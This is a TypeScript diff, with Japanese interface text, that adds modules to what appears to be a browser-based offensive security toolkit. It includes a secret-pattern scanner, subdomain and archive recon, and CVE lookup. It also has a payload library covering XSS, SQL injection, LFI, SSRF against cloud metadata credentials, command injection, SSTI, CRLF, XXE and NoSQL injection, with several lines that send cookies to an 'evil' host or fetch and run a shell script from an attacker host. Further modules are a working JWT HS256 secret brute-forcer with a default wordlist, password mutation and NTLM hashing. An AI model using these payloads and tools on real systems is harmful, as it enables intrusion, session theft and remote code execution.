+  const btn = document.getElementById("ckie-run") as HTMLButtonElement | null;
+  const out = document.getElementById("ckie-out") as HTMLDivElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", () => {
+    const txt = (inEl?.value || "").trim();
+    if (!txt) {
+      out.innerHTML = "";
+      return;
+    }
+    const lines = txt
+      .split(/\n|, (?=\w+=)/)
+      .map((l) => l.replace(/^Set-Cookie:\s*/i, "").trim())
+      .filter(Boolean);
+    const cards = lines.map((line) => {
+      const parts = line.split(";").map((p) => p.trim());
+      const [nameVal, ...attrs] = parts;
+      const eq = nameVal.indexOf("=");
+      const name = eq >= 0 ? nameVal.slice(0, eq) : nameVal;
+      const value = eq >= 0 ? nameVal.slice(eq + 1) : "";
+      const attrMap: Record<string, string> = {};
+      for (const a of attrs) {
+        const i = a.indexOf("=");
+        if (i >= 0) attrMap[a.slice(0, i).toLowerCase()] = a.slice(i + 1);
+        else attrMap[a.toLowerCase()] = "true";
+      }
+      const secure = !!attrMap["secure"];
+      const httpOnly = !!attrMap["httponly"];
+      const sameSite = attrMap["samesite"] || "(未設定)";
+      const issues: string[] = [];
+      if (!secure) issues.push("Secure 無し → HTTPS 以外でも送信される");
+      if (!httpOnly)
+        issues.push("HttpOnly 無し → JS から document.cookie で読める");
+      if (sameSite === "(未設定)" || /none/i.test(sameSite))
+        issues.push(`SameSite=${sameSite} → CSRF リスク`);
+      // JWT 形式判定
+      const isJwt = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(
+        value,
+      );
+      return `<div style="padding:6px 8px;border:1px solid #2c2c2c;border-radius:4px;margin-bottom:4px;background:#1f1f1f">
+        <div style="font-weight:600">${escapeHtml(name)}</div>
+        <div style="font-size:11px;color:#aaa;word-break:break-all">value: ${escapeHtml(value.slice(0, 200))}${value.length > 200 ? "…" : ""}${isJwt ? ' <span style="color:#fb923c">[JWT らしき形式]</span>' : ""}</div>
+        <div style="font-size:11px;color:#aaa">Secure: ${secure ? "✅" : "❌"} | HttpOnly: ${httpOnly ? "✅" : "❌"} | SameSite: ${escapeHtml(sameSite)}</div>
+        ${issues.map((i) => `<div style="font-size:11px;color:#cf222e">⚠️ ${escapeHtml(i)}</div>`).join("")}
+      </div>`;
+    });
+    out.innerHTML = cards.join("");
+  });
+}
+
+// ===== 🔑 シークレット検出 =====
+const SECRET_PATTERNS: { name: string; re: RegExp }[] = [
+  { name: "AWS Access Key", re: /AKIA[0-9A-Z]{16}/g },
+  {
+    name: "AWS Secret Key",
+    re: /(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])/g,
+  },
+  { name: "GitHub Token", re: /gh[pousr]_[A-Za-z0-9]{36,}/g },
+  { name: "GitHub OAuth", re: /(?:^|[^a-z])gho_[A-Za-z0-9]{36}/g },
+  { name: "Slack Token", re: /xox[baprs]-[A-Za-z0-9-]{10,}/g },
+  {
+    name: "Slack Webhook",
+    re: /https:\/\/hooks\.slack\.com\/services\/[A-Z0-9/]+/g,
+  },
+  { name: "Google API Key", re: /AIza[0-9A-Za-z_-]{35}/g },
+  { name: "Stripe Live Key", re: /sk_live_[0-9a-zA-Z]{24,}/g },
+  { name: "Stripe Test Key", re: /sk_test_[0-9a-zA-Z]{24,}/g },
+  { name: "Mailgun API Key", re: /key-[0-9a-zA-Z]{32}/g },
+  { name: "SendGrid API Key", re: /SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}/g },
+  { name: "Twilio SID", re: /AC[a-f0-9]{32}/g },
+  {
+    name: "Heroku API Key",
+    re: /[hH]eroku[a-zA-Z0-9_ -]*['"][0-9a-fA-F-]{36}['"]/g,
+  },
+  {
+    name: "JWT",
+    re: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g,
+  },
+  {
+    name: "Private Key (PEM)",
+    re: /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----/g,
+  },
+  {
+    name: "Generic Secret (代入)",
+    re: /(?:api[_-]?key|secret|password|token)\s*[:=]\s*['"][^'"\s]{8,}['"]/gi,
+  },
+  { name: "URL に Basic 認証", re: /https?:\/\/[^\s/:@]+:[^\s/:@]+@[^\s/]+/g },
+];
+function setupSecretsScannerSub(): void {
+  const inEl = document.getElementById(
+    "secr-input",
+  ) as HTMLTextAreaElement | null;
+  const btn = document.getElementById("secr-run") as HTMLButtonElement | null;
+  const out = document.getElementById("secr-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", () => {
+    const txt = inEl?.value || "";
+    if (!txt) {
+      out.textContent = "";
+      return;
+    }
+    const findings: string[] = [];
+    for (const p of SECRET_PATTERNS) {
+      const matches = txt.match(p.re);
+      if (matches && matches.length > 0) {
+        const uniq = Array.from(new Set(matches));
+        for (const m of uniq.slice(0, 20))
+          findings.push(`[${p.name}] ${m.slice(0, 200)}`);
+        if (uniq.length > 20)
+          findings.push(`  …他 ${uniq.length - 20} 件 (${p.name})`);
+      }
+    }
+    out.textContent =
+      findings.length === 0
+        ? "⭕ 既知のシークレットパターンは検出されませんでした"
+        : findings.join("\n");
+  });
+}
+
+// ===== 🌳 サブドメイン (crt.sh) =====
+function setupSubdomainSub(): void {
+  const inEl = document.getElementById(
+    "subd-domain",
+  ) as HTMLInputElement | null;
+  const btn = document.getElementById("subd-run") as HTMLButtonElement | null;
+  const out = document.getElementById("subd-out") as HTMLPreElement | null;
+  const status = document.getElementById("subd-status");
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const d = (inEl?.value || "").trim();
+    if (!d) return;
+    if (status) status.textContent = "crt.sh 検索中…";
+    out.textContent = "";
+    try {
+      const r = await fetch(
+        `https://crt.sh/?q=%25.${encodeURIComponent(d)}&output=json`,
+      );
+      if (!r.ok) throw new Error("crt.sh: " + r.status);
+      const arr = (await r.json()) as { name_value: string }[];
+      const set = new Set<string>();
+      for (const e of arr) {
+        for (const name of e.name_value.split("\n")) {
+          const n = name.trim().toLowerCase();
+          if (n && !n.startsWith("*")) set.add(n);
+        }
+      }
+      const list = Array.from(set).sort();
+      out.textContent = list.join("\n") || "(該当なし)";
+      if (status) status.textContent = `${list.length} 件`;
+    } catch (e) {
+      out.textContent = `エラー: ${String(e)}`;
+      if (status) status.textContent = "";
+    }
+  });
+}
+
+// ===== 📜 Wayback URL =====
+function setupWaybackSub(): void {
+  const inEl = document.getElementById("wb-domain") as HTMLInputElement | null;
+  const limEl = document.getElementById("wb-limit") as HTMLInputElement | null;
+  const btn = document.getElementById("wb-run") as HTMLButtonElement | null;
+  const out = document.getElementById("wb-out") as HTMLPreElement | null;
+  const status = document.getElementById("wb-status");
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const d = (inEl?.value || "").trim();
+    if (!d) return;
+    const lim = parseInt(limEl?.value || "500", 10);
+    if (status) status.textContent = "Wayback 取得中…";
+    out.textContent = "";
+    try {
+      const u = `https://web.archive.org/cdx/search/cdx?url=*.${encodeURIComponent(d)}/*&output=json&fl=original&collapse=urlkey&limit=${lim}`;
+      const r = await fetch(u);
+      if (!r.ok) throw new Error("wayback: " + r.status);
+      const arr = (await r.json()) as string[][];
+      const urls = arr.slice(1).map((row) => row[0]);
+      out.textContent = urls.join("\n") || "(該当なし)";
+      if (status) status.textContent = `${urls.length} 件`;
+    } catch (e) {
+      out.textContent = `エラー: ${String(e)}`;
+      if (status) status.textContent = "";
+    }
+  });
+}
+
+// ===== 🐛 CVE Lookup (NVD) =====
+function setupCveLookupSub(): void {
+  const inEl = document.getElementById("cve-id") as HTMLInputElement | null;
+  const btn = document.getElementById("cve-run") as HTMLButtonElement | null;
+  const out = document.getElementById("cve-out") as HTMLDivElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const q = (inEl?.value || "").trim();
+    if (!q) return;
+    out.innerHTML = '<span style="color:#888">NVD 検索中…</span>';
+    try {
+      const isCveId = /^cve-\d{4}-\d{4,}$/i.test(q);
+      const url = isCveId
+        ? `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${encodeURIComponent(q.toUpperCase())}`
+        : `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(q)}&resultsPerPage=20`;
+      const r = await fetch(url);
+      if (!r.ok) throw new Error("NVD: " + r.status);
+      const data = (await r.json()) as {
+        vulnerabilities?: {
+          cve: {
+            id: string;
+            descriptions: { lang: string; value: string }[];
+            metrics?: {
+              cvssMetricV31?: {
+                cvssData: { baseScore: number; baseSeverity: string };
+              }[];
+              cvssMetricV30?: {
+                cvssData: { baseScore: number; baseSeverity: string };
+              }[];
+              cvssMetricV2?: { cvssData: { baseScore: number } }[];
+            };
+            references?: { url: string }[];
+            published?: string;
+          };
+        }[];
+      };
+      const vulns = data.vulnerabilities || [];
+      if (vulns.length === 0) {
+        out.innerHTML = "<em>該当なし</em>";
+        return;
+      }
+      out.innerHTML = vulns
+        .map((v) => {
+          const c = v.cve;
+          const desc = c.descriptions.find((d) => d.lang === "en")?.value || "";
+          const m =
+            c.metrics?.cvssMetricV31?.[0]?.cvssData ||
+            c.metrics?.cvssMetricV30?.[0]?.cvssData;
+          const score = m ? `${m.baseScore} (${m.baseSeverity})` : "N/A";
+          const sevColor =
+            m && m.baseScore >= 9
+              ? "#cf222e"
+              : m && m.baseScore >= 7
+                ? "#fb923c"
+                : m && m.baseScore >= 4
+                  ? "#facc15"
+                  : "#1a7f37";
+          return `<div style="padding:6px 8px;border:1px solid #2c2c2c;border-radius:4px;margin-bottom:6px;background:#1f1f1f">
+            <div><strong><a href="https://nvd.nist.gov/vuln/detail/${c.id}" target="_blank" style="color:#60a5fa">${c.id}</a></strong> <span style="color:${sevColor}">CVSS: ${score}</span> <span style="color:#888">${escapeHtml(c.published?.slice(0, 10) || "")}</span></div>
+            <div style="font-size:11px;color:#ccc;margin-top:4px">${escapeHtml(desc.slice(0, 600))}${desc.length > 600 ? "…" : ""}</div>
+          </div>`;
+        })
+        .join("");
+    } catch (e) {
+      out.innerHTML = `<span style="color:#cf222e">エラー: ${escapeHtml(String(e))}</span>`;
+    }
+  });
+}
+
+// ===== 💣 ペイロードライブラリ =====
+const PAYLOADS: Record<string, string[]> = {
+  xss: [
+    `<script>alert(1)</script>`,
+    `<img src=x onerror=alert(1)>`,
+    `<svg/onload=alert(1)>`,
+    `"><script>alert(1)</script>`,
+    `'><img src=x onerror=alert(1)>`,
+    `javascript:alert(1)`,
+    `<body onload=alert(1)>`,
+    `<iframe src="javascript:alert(1)">`,
+    `<input autofocus onfocus=alert(1)>`,
+    `<details open ontoggle=alert(1)>`,
+    `<a href="javascript:alert(1)">click</a>`,
+    `"-alert(1)-"`,
+    `';alert(1);//`,
+    `<script>fetch('//evil/?c='+document.cookie)</script>`,
+    `<img src=1 onerror="this.src='//evil/?c='+document.cookie">`,
+    `<svg><script>alert&#40;1&#41;</script>`,
+    `<math><mi/xlink:href="javascript:alert(1)">`,
+    `<object data="javascript:alert(1)">`,
+    `<embed src="javascript:alert(1)">`,
+    `<style>@import"javascript:alert(1)";</style>`,
+  ],
+  sqli: [
+    `' OR '1'='1`,
+    `" OR "1"="1`,
+    `' OR 1=1--`,
+    `" OR 1=1--`,
+    `') OR ('1'='1`,
+    `' OR '1'='1' /*`,
+    `admin'--`,
+    `admin' #`,
+    `admin'/*`,
+    `' UNION SELECT NULL--`,
+    `' UNION SELECT NULL,NULL--`,
+    `' UNION SELECT NULL,NULL,NULL--`,
+    `' UNION SELECT username,password FROM users--`,
+    `1' AND SLEEP(5)--`,
+    `1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--`,
+    `1; WAITFOR DELAY '0:0:5'--`,
+    `1' AND extractvalue(1,concat(0x7e,(SELECT version())))--`,
+    `' OR EXISTS(SELECT 1 FROM users)--`,
+    `1' ORDER BY 10--`,
+    `' OR SLEEP(5)#`,
+  ],
+  lfi: [
+    `../../../../etc/passwd`,
+    `../../../../etc/passwd%00`,
+    `....//....//....//etc/passwd`,
+    `..%2f..%2f..%2fetc%2fpasswd`,
+    `..%252f..%252f..%252fetc%252fpasswd`,
+    `/etc/passwd`,
+    `/proc/self/environ`,
+    `/proc/self/cmdline`,
+    `/var/log/apache2/access.log`,
+    `php://filter/convert.base64-encode/resource=index.php`,
+    `php://filter/read=string.rot13/resource=index.php`,
+    `data://text/plain,<?php system($_GET['c']); ?>`,
+    `expect://id`,
+    `file:///etc/passwd`,
+    `\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`,
+    `C:\\Windows\\System32\\drivers\\etc\\hosts`,
+    `C:\\Windows\\win.ini`,
+    `..\\..\\..\\..\\..\\windows\\win.ini`,
+    `/.git/config`,
+    `/.env`,
+  ],
+  ssrf: [
+    `http://127.0.0.1/`,
+    `http://localhost/`,
+    `http://0.0.0.0/`,
+    `http://[::1]/`,
+    `http://127.1/`,
+    `http://2130706433/`,
+    `http://0177.0.0.1/`,
+    `http://0x7f.0.0.1/`,
+    `http://169.254.169.254/latest/meta-data/  (AWS IMDS)`,
+    `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
+    `http://metadata.google.internal/computeMetadata/v1/  (GCP)`,
+    `http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)`,
+    `file:///etc/passwd`,
+    `gopher://127.0.0.1:6379/_INFO`,
+    `dict://127.0.0.1:11211/stats`,
+    `http://burpcollaborator.example/`,
+    `http://example.com@127.0.0.1/`,
+    `http://127.0.0.1#@example.com/`,
+    `http://127.0.0.1.nip.io/`,
+    `http://localtest.me/`,
+  ],
+  cmdi: [
+    `; id`,
+    `| id`,
+    `|| id`,
+    `&& id`,
+    `\` id \``,
+    `$(id)`,
+    `; ls -la`,
+    `; cat /etc/passwd`,
+    `| cat /etc/passwd`,
+    `& whoami`,
+    `& dir`,
+    `; ping -c 4 attacker.example`,
+    `\`curl http://attacker/$(whoami)\``,
+    `;wget http://attacker/sh.sh -O- |sh`,
+    `%0a id`,
+    `%0aid`,
+    `'$(id)'`,
+    `"$(id)"`,
+    `;sleep 10`,
+    `|sleep 10`,
+  ],
+  ssti: [
+    `{{7*7}}`,
+    `{{7*'7'}}   (Jinja2: '7777777')`,
+    `\${7*7}    (Java/Freemarker)`,
+    `<%= 7*7 %>  (ERB)`,
+    `#{7*7}    (Ruby)`,
+    `{{config}}`,
+    `{{config.items()}}`,
+    `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
+    `{{ ''.__class__.__mro__[1].__subclasses__() }}`,
+    `\${T(java.lang.Runtime).getRuntime().exec('id')}`,
+    `\${"freemarker.template.utility.Execute"?new()("id")}`,
+    `<#assign value="freemarker.template.utility.Execute"?new()> \${value("id")}`,
+    `{% for x in ().__class__.__base__.__subclasses__() %}{{x}}{% endfor %}`,
+  ],
+  crlf: [
+    `%0d%0aSet-Cookie:%20admin=true`,
+    `%0d%0aLocation:%20https://evil.com`,
+    `%0d%0a%0d%0a<script>alert(1)</script>`,
+    `\\r\\nSet-Cookie: x=y`,
+    `%E5%98%8A%E5%98%8DSet-Cookie:%20test=1  (UTF-8 overlong)`,
+    `?param=test%0d%0aHeader:%20Injected`,
+  ],
+  xxe: [
+    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
+    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker/">]><foo>&xxe;</foo>`,
+    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker/ext.dtd">%ext;]>`,
+    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`,
+    `<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>`,
+  ],
+  nosql: [
+    `{"$ne": null}`,
+    `{"$ne": ""}`,
+    `{"$gt": ""}`,
+    `{"$regex": ".*"}`,
+    `{"$where": "this.password.length > 0"}`,
+    `username[$ne]=&password[$ne]=`,
+    `{"username": {"$ne": null}, "password": {"$ne": null}}`,
+    `';return(true);var x='`,
+    `";return(true);var x="`,
+    `{"$or":[{"a":1},{"a":2}]}`,
+  ],
+};
+function setupPayloadLibrarySub(): void {
+  const sel = document.getElementById("pay-cat") as HTMLSelectElement | null;
+  const filt = document.getElementById("pay-filter") as HTMLInputElement | null;
+  const out = document.getElementById("pay-out") as HTMLPreElement | null;
+  if (!sel || !out) return;
+  const render = (): void => {
+    const cat = sel.value;
+    const f = (filt?.value || "").toLowerCase();
+    const list = (PAYLOADS[cat] || []).filter((p) =>
+      f ? p.toLowerCase().includes(f) : true,
+    );
+    out.textContent = list.join("\n");
+  };
+  sel.addEventListener("change", render);
+  filt?.addEventListener("input", render);
+  render();
+}
+
+// ===== 🐧 GTFOBins / 🪟 LOLBAS =====
+function setupGtfoLolbasSub(): void {
+  const inEl = document.getElementById("gtfo-bin") as HTMLInputElement | null;
+  const btn = document.getElementById("gtfo-run") as HTMLButtonElement | null;
+  const out = document.getElementById("gtfo-out") as HTMLDivElement | null;
+  if (!btn || !out) return;
+  const run = (): void => {
+    const b = (inEl?.value || "").trim().toLowerCase();
+    if (!b) {
+      out.innerHTML = "";
+      return;
+    }
+    const enc = encodeURIComponent(b);
+    out.innerHTML = `
+      <div style="display:flex;gap:8px;flex-wrap:wrap">
+        <a href="https://gtfobins.github.io/gtfobins/${enc}/" target="_blank" style="color:#60a5fa;padding:6px 10px;border:1px solid #2c2c2c;border-radius:4px;background:#1f1f1f">🐧 GTFOBins: ${escapeHtml(b)}</a>
+        <a href="https://lolbas-project.github.io/lolbas/Binaries/${enc}/" target="_blank" style="color:#60a5fa;padding:6px 10px;border:1px solid #2c2c2c;border-radius:4px;background:#1f1f1f">🪟 LOLBAS: ${escapeHtml(b)}</a>
+        <a href="https://www.google.com/search?q=${enc}+gtfobins+OR+lolbas+privesc" target="_blank" style="color:#60a5fa;padding:6px 10px;border:1px solid #2c2c2c;border-radius:4px;background:#1f1f1f">🔍 Google</a>
+        <a href="https://hijacklibs.net/api/lookup/${enc}" target="_blank" style="color:#60a5fa;padding:6px 10px;border:1px solid #2c2c2c;border-radius:4px;background:#1f1f1f">🪝 HijackLibs</a>
+      </div>`;
+  };
+  btn.addEventListener("click", run);
+  inEl?.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") run();
+  });
+}
+
+// ===== 👤 ユーザー名生成 =====
+function setupUsernameGenSub(): void {
+  const f = document.getElementById("un-first") as HTMLInputElement | null;
+  const m = document.getElementById("un-middle") as HTMLInputElement | null;
+  const l = document.getElementById("un-last") as HTMLInputElement | null;
+  const btn = document.getElementById("un-run") as HTMLButtonElement | null;
+  const out = document.getElementById("un-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", () => {
+    const first = (f?.value || "").trim().toLowerCase();
+    const mid = (m?.value || "").trim().toLowerCase();
+    const last = (l?.value || "").trim().toLowerCase();
+    if (!first && !last) {
+      out.textContent = "first または last を入力してください";
+      return;
+    }
+    const fi = first[0] || "";
+    const mi = mid[0] || "";
+    const li = last[0] || "";
+    const set = new Set<string>();
+    const seps = ["", ".", "_", "-"];
+    const add = (v: string): void => {
+      if (v) set.add(v);
+    };
+    for (const s of seps) {
+      if (first && last) {
+        add(`${first}${s}${last}`);
+        add(`${last}${s}${first}`);
+        add(`${fi}${s}${last}`);
+        add(`${first}${s}${li}`);
+        add(`${last}${s}${fi}`);
+      }
+      if (first && mid && last) {
+        add(`${first}${s}${mid}${s}${last}`);
+        add(`${fi}${mi}${last}`);
+        add(`${first}${s}${mi}${s}${last}`);
+        add(`${fi}${s}${mid}${s}${last}`);
+      }
+    }
+    add(first);
+    add(last);
+    add(`${fi}${last}`);
+    add(`${first}${li}`);
+    add(`${last}${fi}`);
+    add(`${fi}${li}`);
+    add(`${first}${last}`);
+    add(`${last}${first}`);
+    // 年付き
+    const years = [2023, 2024, 2025, 2026, 1990, 1995, 2000];
+    const base = Array.from(set);
+    for (const b of base) for (const y of years) set.add(b + y);
+    out.textContent = Array.from(set).sort().join("\n");
+  });
+}
+
+// ===== 📖 ワードリスト変異 =====
+function leetVariants(s: string): string[] {
+  const map: Record<string, string[]> = {
+    a: ["@", "4"],
+    e: ["3"],
+    i: ["1", "!"],
+    o: ["0"],
+    s: ["$", "5"],
+    t: ["7"],
+    l: ["1"],
+    g: ["9"],
+  };
+  const out = new Set<string>([s]);
+  for (let i = 0; i < s.length; i++) {
+    const c = s[i].toLowerCase();
+    if (map[c]) {
+      for (const r of map[c]) {
+        const cur = Array.from(out);
+        for (const w of cur) {
+          out.add(w.slice(0, i) + r + w.slice(i + 1));
+        }
+      }
+    }
+  }
+  return Array.from(out);
+}
+function setupWordlistMutSub(): void {
+  const inEl = document.getElementById(
+    "mut-input",
+  ) as HTMLTextAreaElement | null;
+  const btn = document.getElementById("mut-run") as HTMLButtonElement | null;
+  const out = document.getElementById("mut-out") as HTMLPreElement | null;
+  const cap = document.getElementById("mut-cap") as HTMLInputElement | null;
+  const leet = document.getElementById("mut-leet") as HTMLInputElement | null;
+  const year = document.getElementById("mut-year") as HTMLInputElement | null;
+  const sym = document.getElementById("mut-sym") as HTMLInputElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", () => {
+    const lines = (inEl?.value || "")
+      .split(/\n/)
+      .map((l) => l.trim())
+      .filter(Boolean);
+    const set = new Set<string>(lines);
+    if (cap?.checked) {
+      for (const w of lines) {
+        set.add(w[0].toUpperCase() + w.slice(1));
+        set.add(w.toUpperCase());
+      }
+    }
+    if (leet?.checked) {
+      for (const w of Array.from(set))
+        for (const v of leetVariants(w)) set.add(v);
+    }
+    const base = Array.from(set);
+    if (year?.checked) {
+      for (const w of base) for (let y = 1990; y <= 2026; y++) set.add(w + y);
+    }
+    if (sym?.checked) {
+      for (const w of base)
+        for (const s of ["!", "@", "#", "$", "?", "1", "123", "!!"])
+          set.add(w + s);
+    }
+    out.textContent = `# ${set.size} 件\n` + Array.from(set).join("\n");
+  });
+}
+
+// ===== 🔓 JWT シークレット ブルートフォース =====
+const JWT_DEFAULT_DICT = `secret
+secret123
+password
+admin
+test
+key
+your-256-bit-secret
+your_256_bit_secret
+jwt
+jwt_secret
+jwtsecret
+changeme
+default
+qwerty
+12345
+123456
+abcdef
+demo
+example
+mysecret
+topsecret
+notsosecret
+shhh
+letmein
+hunter2
+P@ssw0rd
+Password1
+welcome
+master
+root
+supersecret
+foo
+bar
+baz
+abc123
+helloworld
+randomstring
+api_key
+apikey
+0123456789
+1234567890
+nimda
+admin123
+admin!
+secretkey
+secret_key
+SECRET_KEY
+JWT_SECRET
+SUPER_SECRET
+default_secret
+my-secret-key
+test_secret`;
+async function hmacSha256B64Url(key: string, data: string): Promise<string> {
+  const k = await crypto.subtle.importKey(
+    "raw",
+    new TextEncoder().encode(key),
+    { name: "HMAC", hash: "SHA-256" },
+    false,
+    ["sign"],
+  );
+  const sig = await crypto.subtle.sign(
+    "HMAC",
+    k,
+    new TextEncoder().encode(data),
+  );
+  let s = "";
+  const u = new Uint8Array(sig);
+  for (let i = 0; i < u.length; i++) s += String.fromCharCode(u[i]);
+  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+}
+function setupJwtBruteSub(): void {
+  const inEl = document.getElementById(
+    "jwtb-input",
+  ) as HTMLTextAreaElement | null;
+  const wEl = document.getElementById(
+    "jwtb-words",
+  ) as HTMLTextAreaElement | null;
+  const btn = document.getElementById("jwtb-run") as HTMLButtonElement | null;
+  const out = document.getElementById("jwtb-out") as HTMLDivElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const tok = (inEl?.value || "").trim();
+    const parts = tok.split(".");
+    if (parts.length !== 3) {
+      out.innerHTML = '<span style="color:#cf222e">JWT 形式が不正</span>';
+      return;
+    }
+    let header: Record<string, unknown>;
+    try {
+      header = JSON.parse(
+        atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")),
+      ) as Record<string, unknown>;
+    } catch {
+      out.innerHTML =
+        '<span style="color:#cf222e">ヘッダのデコードに失敗</span>';
+      return;
+    }
+    if (header.alg !== "HS256") {
+      out.innerHTML = `<span style="color:#cf222e">アルゴリズムが ${escapeHtml(String(header.alg))} です。本ツールは HS256 のみ対応</span>`;
+      return;
+    }
+    const data = parts[0] + "." + parts[1];
+    const target = parts[2];
+    const wlRaw = (wEl?.value || "").trim();
+    const words = (wlRaw || JWT_DEFAULT_DICT)
+      .split(/\n/)
+      .map((s) => s.trim())
+      .filter(Boolean);
+    out.innerHTML = `<span style="color:#888">${words.length} 候補をテスト中…</span>`;
+    let found: string | null = null;
+    let i = 0;
+    for (const w of words) {
+      const sig = await hmacSha256B64Url(w, data);
+      if (sig === target) {
+        found = w;
+        break;
+      }
+      i++;
+    }
+    if (found) {
+      out.innerHTML = `<div style="color:#1a7f37;font-weight:600">🎉 シークレット発見: <code style="background:#1f1f1f;padding:2px 6px;border-radius:3px">${escapeHtml(found)}</code> (${i + 1} / ${words.length})</div>`;
+    } else {
+      out.innerHTML = `<div style="color:#cf222e">❌ 見つかりませんでした (${words.length} 試行)</div>`;
+    }
+  });
+}
+
+// ===== 🔐 NTLM ハッシュ生成 (MD4 of UTF-16LE) =====
+function md4(bytes: Uint8Array): string {
+  // 軽量 MD4 実装
+  function r(x: number, n: number): number {
+    return ((x << n) | (x >>> (32 - n))) >>> 0;
+  }
+  function add(a: number, b: number): number {
+    return (a + b) >>> 0;
+  }
+  const len = bytes.length;
+  const bits = len * 8;
+  const padded = new Uint8Array((((len + 8) >>> 6) << 6) + 64);
+  padded.set(bytes);
+  padded[len] = 0x80;
+  const dv = new DataView(padded.buffer);
+  dv.setUint32(padded.length - 8, bits >>> 0, true);
+  dv.setUint32(padded.length - 4, Math.floor(bits / 0x100000000), true);
+  let a = 0x67452301,
+    b = 0xefcdab89,
+    c = 0x98badcfe,
+    d = 0x10325476;
+  for (let i = 0; i < padded.length; i += 64) {
+    const X: number[] = [];
+    for (let j = 0; j < 16; j++) X.push(dv.getUint32(i + j * 4, true));
+    let aa = a,
+      bb = b,
+      cc = c,
+      dd = d;
+    const F = (x: number, y: number, z: number): number =>
+      ((x & y) | (~x & z)) >>> 0;
+    const G = (x: number, y: number, z: number): number =>
+      ((x & y) | (x & z) | (y & z)) >>> 0;
+    const H = (x: number, y: number, z: number): number => (x ^ y ^ z) >>> 0;
+    const ff = (
+      a: number,
+      b: number,
+      c: number,
+      d: number,
+      k: number,
+      s: number,
+    ): number => r(add(add(a, F(b, c, d)), X[k]), s);
+    const gg = (
+      a: number,
+      b: number,
+      c: number,
+      d: number,
+      k: number,
+      s: number,
+    ): number => r(add(add(add(a, G(b, c, d)), X[k]), 0x5a827999), s);
+    const hh = (
+      a: number,
+      b: number,
+      c: number,
+      d: number,
+      k: number,
+      s: number,
+    ): number => r(add(add(add(a, H(b, c, d)), X[k]), 0x6ed9eba1), s);
+    [
+      [0, 3],
+      [1, 7],
+      [2, 11],
+      [3, 19],
+      [4, 3],
+      [5, 7],
+      [6, 11],
+      [7, 19],
+      [8, 3],
+      [9, 7],
+      [10, 11],
+      [11, 19],
+      [12, 3],
+      [13, 7],
+      [14, 11],
+      [15, 19],
+    ].forEach(([k, s], idx) => {
+      if (idx % 4 === 0) aa = ff(aa, bb, cc, dd, k, s);
+      else if (idx % 4 === 1) dd = ff(dd, aa, bb, cc, k, s);
+      else if (idx % 4 === 2) cc = ff(cc, dd, aa, bb, k, s);
+      else bb = ff(bb, cc, dd, aa, k, s);
+    });
+    [
+      [0, 3],
+      [4, 5],
+      [8, 9],
+      [12, 13],
+      [1, 3],
+      [5, 5],
+      [9, 9],
+      [13, 13],
+      [2, 3],
+      [6, 5],
+      [10, 9],
+      [14, 13],
+      [3, 3],
+      [7, 5],
+      [11, 9],
+      [15, 13],
+    ].forEach(([k, s], idx) => {
+      if (idx % 4 === 0) aa = gg(aa, bb, cc, dd, k, s);
+      else if (idx % 4 === 1) dd = gg(dd, aa, bb, cc, k, s);
+      else if (idx % 4 === 2) cc = gg(cc, dd, aa, bb, k, s);
+      else bb = gg(bb, cc, dd, aa, k, s);
+    });
+    [
+      [0, 3],
+      [8, 9],
+      [4, 11],
+      [12, 15],
+      [2, 3],
+      [10, 9],
+      [6, 11],
+      [14, 15],
+      [1, 3],
+      [9, 9],
+      [5, 11],
+      [13, 15],
+      [3, 3],
+      [11, 9],
+      [7, 11],
+      [15, 15],
+    ].forEach(([k, s], idx) => {
+      if (idx % 4 === 0) aa = hh(aa, bb, cc, dd, k, s);
+      else if (idx % 4 === 1) dd = hh(dd, aa, bb, cc, k, s);
+      else if (idx % 4 === 2) cc = hh(cc, dd, aa, bb, k, s);
+      else bb = hh(bb, cc, dd, aa, k, s);
+    });
+    a = add(a, aa);
+    b = add(b, bb);
+    c = add(c, cc);
+    d = add(d, dd);
+  }
+  const tohex = (n: number): string => {
+    let s = "";
+    for (let i = 0; i < 4; i++)
+      s += ((n >>> (i * 8)) & 0xff).toString(16).padStart(2, "0");
+    return s;
+  };
+  return tohex(a) + tohex(b) + tohex(c) + tohex(d);
+}
+function setupNtlmSub(): void {
+  const inEl = document.getElementById("ntlm-input") as HTMLInputElement | null;
+  const btn = document.getElementById("ntlm-run") as HTMLButtonElement | null;
+  const out = document.getElementById("ntlm-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", () => {
+    const v = inEl?.value || "";
